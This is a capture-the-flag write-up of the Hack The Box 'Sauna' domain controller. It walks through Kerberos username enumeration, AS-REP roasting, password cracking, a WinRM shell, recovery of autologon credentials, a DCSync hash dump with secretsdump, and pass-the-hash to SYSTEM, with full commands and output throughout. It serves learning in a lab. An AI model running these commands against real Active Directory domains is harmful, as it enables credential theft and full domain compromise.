
![sauna badge](images/sauna/saunabadge.jpg)

Sauna is a Windows machine rated Easy on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.175`

```
Nmap scan report for 10.10.10.175
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2020-03-31 16:41:54 +08 for 687s
Not shown: 65515 filtered ports
Reason: 65515 no-responses
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-03-31 15:51:36Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58494/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

From the scan results, we know that this is probably an Active Directory Domain Controller.

## LDAP Recon

To find out more about this AD domain, let's run the ldap-search NSE script.

`nmap -p 389 --script ldap-search 10.10.10.175`

```
Nmap scan report for EGOTISTICAL-BANK.LOCAL (10.10.10.175)
Host is up (0.22s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search:
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

The results above only show the parts that we are interested in. In particular, we uncovered a user **Hugo Smith**.

## HTTP Recon

The homepage shows the website of Egotistical Bank.

![bank homepage](images/sauna/homepage.png)

Browsing through the website and ignoring the Loren Ipsum text, we notice:

* Numerous references to roasting, sauna, and kerb (This is the CTF portion hinting at a possible vulnerability with the Kerberos setup.)
* Names of staff we can use to construct a username list.

## Enumerating Kerberos Usernames

If you're new to Keberos, this is an [excellent introduction](https://www.roguelynn.com/words/explain-like-im-5-kerberos/).

## Generating Username List

Username Anarchy is a [nifty tool](https://github.com/urbanadventurer/username-anarchy) you can use to generate a username list.

`./username-anarchy -i staffnames.txt > usernamelist.txt`

### Testing Kerberos Authentication Server Response

As Kerberos replies differently for known and unknown usernames, it's possible to check if a username exists. An [nmap script](https://nmap.org/nsedoc/scripts/krb5-enum-users.html) is available.

`nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb='usernamelist.txt' 10.10.10.175`

```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users:
| Discovered Kerberos principals
|     hsmith@EGOTISTICAL-BANK.LOCAL
|     HSmith@EGOTISTICAL-BANK.LOCAL
|     FSmith@EGOTISTICAL-BANK.LOCAL
|_    fsmith@EGOTISTICAL-BANK.LOCAL
```

* username:fsmith

## AS-REP Roasting

Conditions:

* Have valid username
* Pre-Authentication for user is disabled

How it works:

1. User sends a request to the Kerberos Authentication Server (AS).
2. As pre-authentication is disabled, the AS will reply with a logon session key and a Ticket-Granting Ticket (TGT) **without checking any credentials**. (Hence, AS-REP.)
3. Both the **logon session key** and the **TGT** are encrypted.
3. In particular, logon session key is encrypted with a key derived from the **user's password**.
4. With the encrypted logon session key, we can crack for the user's password offline.

### Requesting For Encrypted Ticket From AS

From Linux, Impacket is the go-to tool for pentesting Kerberos.

`./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile TargetUsers.txt -format john -outputfile hashes.asreproast`

```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

User hsmith requires Pre-Authentication so we cannot get the TGT and the encrypted logon session key.

But we are able to obtain the information for fsmith.

The nmap script above and GetNPUsers use the same mechanism, so technically you can skip the separate user enumeration.

### Cracking Password

Next, crack the password using John The Ripper.

`john  --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast `

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
```

We now have one set of credentials.

* username: fsmith
* password: Thestrokes23

## Getting A Shell

From our port scan, we see that the port 5985 is open. It is the port for WinRM which is a remote management protocol (like SSH) for Windows.

There are several Linux tools for connecting to WinRM, but from my experience, the most reliable one is [evil-winrm](https://github.com/Hackplayers/evil-winrm).

To get a WinRM shell:

`evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`

```
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> cat C:\Users\FSmith\Desktop\user.txt
```

**We get user.**

## Finding The Autologon Password

winPEAS stands for [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS).

Let's run it to automate initial privilege escalation enumeration.

Evil-winrm offers an easy way to get C# executables into a target machine. To so, we need to modify our initial command to include the folder with the winPEAS binary.

```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 -e /folder/withbinary/
*Evil-WinRM* PS C:\Users\FSmith\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  

[+] Bypass-4MSI
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary

*Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-Binary /folder/withbinary/winPEAS.exe
```

It returns a long output, but the red highlight makes it easy to spot the following.

```
[+] Looking for AutoLogon credentials(T1012)
  Some AutoLogon credentials were found!!
  DefaultDomainName             :  EGOTISTICALBANK
  DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
  DefaultPassword               :  Moneymakestheworldgoround!
  ```

If you do not want to use winPEAS, you can also find it through a [manual enumeration process](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).

* Autologon information is stored in the HKLM [registry hive](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives). A hive includes a logical group of keys, subkeys, and values.
* To retrieve the information, we can use **reg** - [a console registry tool](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query).
* The `query` parameter lists the next tier of subkeys and their entries.

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    <SNIP>
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    <SNIP>
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

## DCSync

Many Active Directory (AD) infrastructure has multiple Domain Controllers. To maintain a consistent environment, you need a way to replicate AD objects for each DC. The replication is done through an API (DRSUAPI).

In a DCSync attack, we impersonate a Domain Controller to replicate objects.

### Required Permissions

However, to perform a DCSync attack, the compromised account needs to have the following replication permissions:

The “DS-Replication-Get-Changes” extended right
* CN: DS-Replication-Get-Changes
* GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2

The “Replicating Directory Changes All” extended right
* CN: DS-Replication-Get-Changes-All
* GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

The “Replicating Directory Changes In Filtered Set” extended right (not always needed)
* CN: DS-Replication-Get-Changes-In-Filtered-Set
* GUID: 89e95b76-444d-4c62-991a-0facbeda640c

### Checking Active Directory Permissions

We have compromised two accounts:

* fsmith
* svc_loanmgr.

Let's check if any of them has the required permissions for a DCSync attack.

We need the ActiveDirectory module for the following command.

`Import-Module ActiveDirectory`

In the command below, the part before `|` gets specific access permissions of objects in the stated domain. It returns many results, so the part after `|` filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)

`(Get-ACL "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" )}`

The results show that svc_loanmgr has the required permissions.

```
<SNIP>
ActiveDirectoryRights : ExtendedRight
InheritanceType       : None
ObjectType            : 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : EGOTISTICALBANK\svc_loanmgr
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ExtendedRight
InheritanceType       : None
ObjectType            : 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : EGOTISTICALBANK\svc_loanmgr
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

### Dumping Secrets

We can perform a DCsync attack remotely with Impacket's secretsdump.py.

`impacket-secretsdump -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175`

```
root@kali:~/htb/openadmin# impacket-secretsdump -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
<SNIP>
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
<SNIP>
[*] Cleaning up...
```

Now that we have the hashes, we can use them to get admin access.

### Passing The Hash

The SMB port is open so psexec is an option.

`./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`

```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file lITmZIjg.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service JnaQ on 10.10.10.175.....
[*] Starting service JnaQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

We are passing the NTLM hashes here. You can also use the Kerberos key. But there more details to pay attention to when you authenticate with Kerberos including time sync and using a FQDN.

# Ending Thoughts

This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos. It is a very educational box for me.

*References*

staffname format

ad Permissions

dcsync with impacket

add to pentesting notes

Kerberos and AS-REP Roasting

* https://www.tarlogic.com/en/blog/how-kerberos-works/
* https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting
* https://docs.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets
* https://www.tarlogic.com/en/blog/how-to-attack-kerberos/

evil-winrm
https://hacks.biz/evilwinrm-the-ultimate-winrm-shell-for-pentesting/

https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
